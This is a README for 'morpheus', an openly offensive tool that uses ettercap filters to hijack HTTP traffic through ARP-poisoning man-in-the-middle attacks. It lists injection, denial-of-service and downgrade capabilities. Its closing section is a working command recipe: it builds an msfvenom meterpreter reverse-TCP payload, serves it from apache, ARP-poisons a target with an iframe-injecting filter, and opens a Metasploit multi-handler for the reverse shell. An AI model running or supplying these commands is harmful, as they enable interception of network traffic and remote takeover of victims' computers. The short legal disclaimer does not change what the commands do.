[![Version](https://img.shields.io/badge/MORPHEUS-1.1-brightgreen.svg?maxAge=259200)]()
[![Stage](https://img.shields.io/badge/Release-developing-red.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-linux-orange.svg)]()
[![Github All Releases](https://img.shields.io/github/downloads/atom/atom/total.svg)]()
[![AUR](https://img.shields.io/aur/license/yaourt.svg)]()

# Morpheus - automated ettercap TCP/IP Hijacking tool
    Version release : v1.1-Alpha
    Author : pedro ubuntu  [ r00t-3xp10it ]
    Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS
    Suspicious-Shell-Activity (SSA) RedTeam develop @2016

# LEGAL DISCLAMER
    The author does not hold any responsibility for the bad use
    of this tool, remember that attacking targets without prior
    consent is illegal and punished by law.

# Framework description
    morpheus.sh framework automates tcp/udp packet manipulation tasks by using
    ettercap filters to manipulate target http requests under MitM attacks
    replacing the http packet contents by our own contents befor sending the
    packet back to the host that have request for it (tcp/ip hijacking).

    work flow:
    1º - arp poison local lan (mitm)
    2º - target requests webpage from network
    3º - attacker modifies webpage response
    4º - modified packet its forward back to target

# What can we acomplish by using filters?
    morpheus ships with a collection of etter filters writen be me to acomplish various tasks:
    replacing images in webpages, replace text in webpages, inject payloads using html <form> tag
    denial-of-service attack (drop,kill packets from source), https/ssh downgrade attacks, redirect
    target browser traffic to another ip address (domain) and also gives you the ability to build
    compile your filter from scratch and lunch it through morpheus framework.

    "Using etter filters allow us to do mutch more than this, but unfortunately i dont know more :("

# Framework limitations
    1º - morpheus will fail if target system its protected againt ARP poison attacks
    2º - morpheus will fail if browser target as installed addon's againts arp/mitm
    3º - downgrade attacks will fail if browser target as installed no-http addon
    4º - target system sometimes needs to clear net cache to arp poison be effective
    5º - replacement string must have the same length as original string to replace
         "eg. replace("word_hello", "hello_word"); <-- the same number of leters"

# Dependencies
    ettercap, zenity

# Credits
    alor&naga (ettercap framework) || ir0ngeek (replace img) || seannicholls (rotate.eft)
    Most of the filters in morpheus framework have been writen be me except the ones described
    above, but this project will contemplate new external (authors) addictions found in the
    fast network as the project continues to grow up (new releases), also new examples can
    be found editing ettercap's etter.filter.examples file that will help us to write new ones.
[ettercap linux man pages](https://linux.die.net/man/8/ettercap)

<br />
# Framework help argument
![morpheus v1.0-Alpha](https://dl.dropboxusercontent.com/u/21426454/morpheus-description.png)

# Framework Main Menu
![morpheus v1.0-Alpha](https://dl.dropboxusercontent.com/u/21426454/morpheus-banner.png)


<br />
---

# Build msfvenom binary
    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f exe -o payload.exe

# Compile [filter].eft filter into iframe.ef
    sudo etterfilter /root/iframe.eft -o /root/iframe.ef

# copy files to apache2 webroot
    sudo cp /root/payload.exe /var/www/html

# Sart apache2 service
    /etc/init.d/apache2 start

# ip_forwarding
    echo "1" > /proc/sys/net/ipv4/ip_forward

# run ettercap mitm+filter
    sudo ettercap -T -q -i wlan0 -F /root/iframe.ef -M ARP /targetip/ /routerip/


# IF YOUR PC USES IPV6 THEN USE THIS CONFIG INSTEAD OF THE ABOVE CODE
    sudo ettercap -T -q -i wlan0 -F /root/iframe.ef -M ARP /targetip// /routerip//


# Start a multi-handler
    sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.67; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_tcp; exploit -j -k'


_EOF
